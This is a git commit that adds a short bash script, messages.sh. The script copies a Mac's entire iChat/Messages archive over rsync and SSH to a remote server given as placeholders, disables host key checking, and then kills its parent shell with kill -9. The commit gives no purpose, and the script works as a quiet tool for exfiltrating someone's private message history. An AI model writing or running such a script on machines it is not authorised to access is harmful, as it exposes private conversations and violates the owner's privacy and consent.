af0b589685b73ca313d34301a788b704a9f42f14
JmAc <macias05r1@gmail.com>
2019-04-23 20:46:08 -0500

    txt

---
+++ messages.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+#Variables 
+user=USER
+host=HOST
+dir=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive/
+serverdir=/send/to/directory/on/sever
+
+rsync -ave "ssh -o StrictHostKeyChecking=no" $dir $user@$host:$serverdir
+
+
+kill -9 $PPID
+
+~                 
